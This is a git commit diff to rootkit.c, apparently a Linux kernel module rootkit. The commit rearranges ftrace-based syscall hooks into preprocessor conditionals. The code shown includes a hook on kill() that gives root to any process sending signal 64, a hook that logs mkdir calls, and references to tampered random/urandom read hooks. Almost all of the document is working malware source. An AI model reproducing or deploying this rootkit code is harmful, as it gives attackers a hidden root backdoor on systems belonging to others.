4b884ab73f8206b7cf47d74b5b7ef8255edfbf61
stauroucristou@gmail.com <stauroucristou@gmail.com>
2021-07-01 21:22:04 -0500

    I put a few functions in conditional preprocessor statements.

--- rootkit.c
+++ rootkit.c
@@ -20,12 +20,59 @@ MODULE_VERSION("0.01");
 static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
 
 static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
-#ifdef PTREGS_SYSCALL_STUBS
 
+#ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
 /**************************************************
  ************************************************ */
+asmlinkage int hook_mkdir(const struct pt_regs *regs)
+{
+    char __user *pathname = (char *)regs->di;
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if (error > 0)
+        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
+
+    orig_mkdir(regs);
+    return 0;
+}
+/**************************************************
+ ************************************************ */
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+    int sig = regs->si;
+
+    if (sig == 64)
+    {
+        printk(KERN_INFO "rootkit: giving root...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(regs);    
+}
+#else
+
+static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
+/**************************************************
+ ************************************************ */
+asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
+{
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if (error > 0)
+        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);
+
+    orig_mkdir(pathname, mode);
+    return 0;
+}
+#endif
 
 void set_root(void)
 {
@@ -119,57 +166,6 @@ static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, 
     kfree(kbuf);
     return bytes_read;
 }
-/**************************************************
- ************************************************ */
-asmlinkage int hook_mkdir(const struct pt_regs *regs)
-{
-    char __user *pathname = (char *)regs->di;
-    char dir_name[NAME_MAX] = {0};
-
-    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
-
-    if (error > 0)
-        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
-
-    orig_mkdir(regs);
-    return 0;
-}
-/**************************************************
- ************************************************ */
-
-asmlinkage int hook_kill(const struct pt_regs *regs)
-{
-    int sig = regs->si;
-
-    if (sig == 64)
-    {
-        printk(KERN_INFO "rootkit: giving root...\n");
-        set_root();
-        return 0;
-    }
-
-    return orig_kill(regs);    
-}
-#else
-
-static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
-/**************************************************
- ************************************************ */
-
-asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
-{
-    char dir_name[NAME_MAX] = {0};
-
-    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
-
-    if (error > 0)
-        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);
-
-    orig_mkdir(pathname, mode);
-    return 0;
-}
-#endif
-
 static struct ftrace_hook hooks[] = {
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("sys_kill", hook_kill, &orig_kill),
